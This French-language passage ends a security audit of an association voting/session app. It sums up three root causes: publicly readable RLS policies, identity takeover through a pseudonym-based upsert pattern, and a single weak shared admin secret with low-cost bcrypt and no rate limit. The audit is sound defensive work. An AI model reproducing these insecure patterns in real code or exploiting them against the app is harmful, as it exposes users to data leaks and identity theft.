- **`cast_vote` et `submit_assertion`** vérifient correctement l'appartenance à la séance.

---

## 7. Lecture d'ensemble

Trois causes racines expliquent l'essentiel du rapport. Le plan d'action gagnera à s'organiser autour d'elles plutôt qu'autour des 19 symptômes.

**1. Les policies RLS en `USING (true)`.** Cinq tables sont en lecture totalement publique : `sessions`, `session_members`, `table_assignments`, `collab_session_users`, `session_sources`. Elles alimentent à elles seules A1, A5, B2, B3, B4, B5 et B6. C'est probablement le chantier au meilleur rapport effet/effort : resserrer ces cinq policies neutralise ou dégrade sept vulnérabilités.

**2. La reprise d'identité sans preuve de possession.** Le même motif — `ON CONFLICT … DO UPDATE SET user_id = auth.uid()` — apparaît dans `join_table`, `confirm_attendance`, `reclaim_prevoting_member` et `register_collab_pseudo`. À chaque fois, connaître un identifiant public (pseudo) suffit à s'emparer d'une identité. C'est un choix de conception délibéré (fluidité du retour depuis un autre appareil), et il faudra arbitrer entre confort d'usage et vol d'identité — mais l'arbitrage actuel est trop permissif.

**3. Un secret unique, partagé et faible, pour tout le pouvoir.** Un seul code Ecclesia pour toute l'association, connu de tous les animateurs, valable sur toutes les tables et sans expiration ; un seul mot de passe superadmin, haché en bcrypt coût 6, interrogeable sans limite depuis Internet, et conservé en clair dans le navigateur. Il n'y a aucune granularité et aucune révocation.

Enfin, une remarque de méthode : le dépôt étant public, **il faut supposer que l'attaquant a lu ce rapport avant vous**. Les corrections doivent tenir face à quelqu'un qui les connaît. Cela plaide pour des contrôles côté serveur (RLS, limitation de débit, secrets granulaires) plutôt que pour des mesures d'interface — et pour publier les correctifs sans détailler publiquement les fenêtres d'exploitation encore ouvertes.
